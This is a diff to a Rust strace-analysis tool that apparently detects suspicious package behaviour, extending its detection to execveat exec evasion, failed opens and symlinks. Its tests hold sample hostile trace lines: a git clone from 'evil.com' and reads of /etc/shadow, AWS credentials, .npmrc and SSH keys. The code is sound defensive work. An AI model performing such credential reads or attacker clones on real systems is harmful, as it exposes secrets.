@@ -1063,7 +1063,10 @@ fn parse_execve_argvs(trace: &str) -> Vec<Vec<String>> {
     // pair match and bypass detection. `[^\[\]]*(?:\[[^\]]*\][^\[\]]*)*` consumes
     // any number of balanced `[...]` spans before the array's real closing `]`.
     let execve_re = EXECVE_RE.get_or_init(|| {
-        Regex::new(r#"execve\([^,]+,\s*\[(?P<argv>[^\[\]]*(?:\[[^\]]*\][^\[\]]*)*)\]"#).unwrap()
+        Regex::new(
+            r#"(?:execve\([^,]+|execveat\([^,]+,\s*[^,]+),\s*\[(?P<argv>[^\[\]]*(?:\[[^\]]*\][^\[\]]*)*)\]"#,
+        )
+        .unwrap()
     });
     let quoted_arg_re =
         QUOTED_ARG_RE.get_or_init(|| Regex::new(r#"\"((?:\\.|[^\"])*)\""#).unwrap());
@@ -1303,6 +1306,23 @@ fn extract_first_arg_fd(args_str: &str) -> Option<i32> {
     args_str[..delim].trim().parse::<i32>().ok()
 }
 
+fn parse_syscall_return(s: &str) -> Option<i32> {
+    let idx = s.rfind(" = ")?;
+    let ret_str = s[idx + 3..].trim_start();
+    let bytes = ret_str.as_bytes();
+    let mut end = 0;
+    if end < bytes.len() && (bytes[end] == b'-' || bytes[end] == b'+') {
+        end += 1;
+    }
+    while end < bytes.len() && bytes[end].is_ascii_digit() {
+        end += 1;
+    }
+    if end == 0 || (end == 1 && (bytes[0] == b'-' || bytes[0] == b'+')) {
+        return None;
+    }
+    ret_str[..end].parse::<i32>().ok()
+}
+
 fn extract_sensitive_file_reads(trace: &str) -> HashSet<String> {
     static LINE_RE: OnceLock<Regex> = OnceLock::new();
     static SYSCALL_RE: OnceLock<Regex> = OnceLock::new();
@@ -1355,11 +1375,7 @@ fn extract_sensitive_file_reads(trace: &str) -> HashSet<String> {
                 .map(|m| m.as_str())
                 .unwrap_or("");
 
-            let mut ret_val: Option<i32> = None;
-            if let Some(idx) = args_and_ret.rfind(" = ") {
-                let ret_str = &args_and_ret[idx + 3..].trim();
-                ret_val = ret_str.parse::<i32>().ok();
-            }
+            let ret_val = parse_syscall_return(args_and_ret);
 
             if matches!(syscall, "clone" | "clone3" | "fork" | "vfork") {
                 if let Some(child_pid) = ret_val.map(|v| v as u32)
@@ -1383,12 +1399,17 @@ fn extract_sensitive_file_reads(trace: &str) -> HashSet<String> {
                 {
                     fd_table.insert((pid, new_fd), path);
                 }
-            } else if matches!(syscall, "open" | "openat" | "openat64" | "openat2")
-                && let Some(path) = pending_syscalls.remove(&pid)
-                && let Some(fd) = ret_val
-                && fd >= 0
-            {
-                fd_table.insert((pid, fd), path);
+            } else if matches!(syscall, "open" | "openat" | "openat64" | "openat2") {
+                let pending_path = pending_syscalls.remove(&pid);
+                if let Some(path) = pending_path
+                    && let Some(fd) = ret_val
+                    && fd >= 0
+                {
+                    if is_sensitive_file_read(&path) {
+                        reads.insert(path.clone());
+                    }
+                    fd_table.insert((pid, fd), path);
+                }
             }
             continue;
         }
@@ -1401,11 +1422,11 @@ fn extract_sensitive_file_reads(trace: &str) -> HashSet<String> {
             let args_str = syscall_caps.name("args").map(|m| m.as_str()).unwrap_or("");
 
             let unfinished = args_str.ends_with("<unfinished ...>");
-            let mut ret_val: Option<i32> = None;
-            if !unfinished && let Some(idx) = args_str.rfind(" = ") {
-                let ret_str = &args_str[idx + 3..].trim();
-                ret_val = ret_str.parse::<i32>().ok();
-            }
+            let ret_val = if !unfinished {
+                parse_syscall_return(args_str)
+            } else {
+                None
+            };
 
             if matches!(syscall, "clone" | "clone3" | "fork" | "vfork") {
                 if let Some(child_pid) = ret_val.map(|v| v as u32)
@@ -1551,18 +1572,23 @@ fn extract_sensitive_file_reads(trace: &str) -> HashSet<String> {
 
                 path = lexical_clean_path(&path);
 
-                if is_sensitive_file_read(&path) {
-                    reads.insert(path.clone());
-                }
-
                 if matches!(syscall, "open" | "openat" | "openat64" | "openat2") {
                     if unfinished {
                         pending_syscalls.insert(pid, path);
                     } else if let Some(fd) = ret_val
                         && fd >= 0
                     {
+                        if is_sensitive_file_read(&path) {
+                            reads.insert(path.clone());
+                        }
                         fd_table.insert((pid, fd), path);
                     }
+                } else if matches!(syscall, "link" | "linkat" | "symlink" | "symlinkat")
+                    && let Some(ret) = ret_val
+                    && ret >= 0
+                    && is_sensitive_file_read(&path)
+                {
+                    reads.insert(path.clone());
                 }
             }
         }
@@ -2433,17 +2459,17 @@ mod tests {
     use super::{
         PolicyConfig, burst_policy_warning, classify_inventory_lines, compare_version_strings,
         count_releases_in_window, decode_dns_name, extract_artifact_findings,
-        extract_connection_ips, extract_dns_map, extract_process_exec_signatures,
-        extract_sensitive_file_reads, filter_allowlisted_artifact_findings,
-        filter_allowlisted_git_clone_signatures, filter_allowlisted_new_connections,
-        filter_allowlisted_process_exec_signatures, filter_allowlisted_sensitive_reads,
-        filter_domain_allowlisted_new_connections_with, find_new_connections_domain_aware,
-        find_new_process_exec_signatures, find_new_sensitive_reads, forward_confirmed_hostname,
-        is_harness_command, is_sandbox_local_ip, is_sensitive_file_read,
-        minimum_release_age_policy_warning, normalize_ip_string, npm_published_times,
-        parse_dns_response, reverse_dns_domain, scan_packages_versions,
-        select_age_eligible_baselines, select_effective_baselines, sort_versions_ascending,
-        strip_artifact_section, unescape_strace_string,
+        extract_connection_ips, extract_dns_map, extract_git_clone_signatures,
+        extract_process_exec_signatures, extract_sensitive_file_reads,
+        filter_allowlisted_artifact_findings, filter_allowlisted_git_clone_signatures,
+        filter_allowlisted_new_connections, filter_allowlisted_process_exec_signatures,
+        filter_allowlisted_sensitive_reads, filter_domain_allowlisted_new_connections_with,
+        find_new_connections_domain_aware, find_new_process_exec_signatures,
+        find_new_sensitive_reads, forward_confirmed_hostname, is_harness_command,
+        is_sandbox_local_ip, is_sensitive_file_read, minimum_release_age_policy_warning,
+        normalize_ip_string, npm_published_times, parse_dns_response, reverse_dns_domain,
+        scan_packages_versions, select_age_eligible_baselines, select_effective_baselines,
+        sort_versions_ascending, strip_artifact_section, unescape_strace_string,
     };
 
     #[test]
@@ -2522,6 +2548,51 @@ execve("/usr/bin/bun\x00extra", ["bun\x00extra", "run\x00extra", "index.js"], 0x
 "#;
         let sigs = extract_process_exec_signatures(trace);
         assert!(sigs.contains("bun|run|index.js"));
+    }
+
+    #[test]
+    fn test_extract_process_exec_signatures_execveat() {
+        // Finding 33: execveat evasion with AT_EMPTY_PATH or dirfd
+        let trace = r#"
+[pid 1234] execveat(AT_FDCWD, "/tmp/b/bun", ["/tmp/b/bun", "run", "_index.js"], 0x7ff, 0) = 0
+[pid 1235] execveat(3, "", ["/usr/bin/python3", "-c", "import os"], 0x7ff, 0x1000) = 0
+"#;
+        let sigs = extract_process_exec_signatures(trace);
+        assert!(sigs.contains("bun|run|_index.js"), "got: {sigs:?}");
+        assert!(sigs.contains("python3|-c|import os"), "got: {sigs:?}");
+    }
+
+    #[test]
+    fn test_extract_git_clone_signatures_execveat() {
+        // Finding 33: execveat with git clone
+        let trace = r#"execveat(AT_FDCWD, "/usr/bin/git", ["git", "clone", "https://evil.com/repo.git"], 0x7ff, 0) = 0"#;
+        let sigs = extract_git_clone_signatures(trace);
+        assert!(
+            sigs.contains("https://evil.com/repo.git|non-recursive"),
+            "got: {sigs:?}"
+        );
+    }
+
+    #[test]
+    fn test_extract_sensitive_file_reads_ignores_failed_syscalls() {
+        // Finding 60: Failed open/openat calls (ret_val < 0) must NOT populate reads.
+        // Doing so would allow an attacker to probe nonexistent/restricted paths in
+        // baseline traces to poison the baseline, evading detection in later versions.
+        let trace = r#"
+[pid 100] openat(AT_FDCWD, "/etc/shadow", O_RDONLY) = -1 EACCES (Permission denied)
+[pid 100] open("/root/.aws/credentials", O_RDONLY) = -1 ENOENT (No such file or directory)
+[pid 101] openat(AT_FDCWD, "/root/.npmrc", O_RDONLY <unfinished ...>
+[pid 101] <... openat resumed> ) = -1 EACCES (Permission denied)
+[pid 102] symlink("/root/.ssh/id_rsa", "badlink") = -1 EPERM (Operation not permitted)
+[pid 103] openat(AT_FDCWD, "/etc/passwd", O_RDONLY) = 3
+"#;
+        let reads = extract_sensitive_file_reads(trace);
+        assert!(reads.contains("/etc/passwd"));
+        assert!(!reads.contains("/etc/shadow"));
+        assert!(!reads.contains("/root/.aws/credentials"));
+        assert!(!reads.contains("/root/.npmrc"));
+        assert!(!reads.contains("/root/.ssh/id_rsa"));
+        assert_eq!(reads.len(), 1);
     }
 
     #[test]
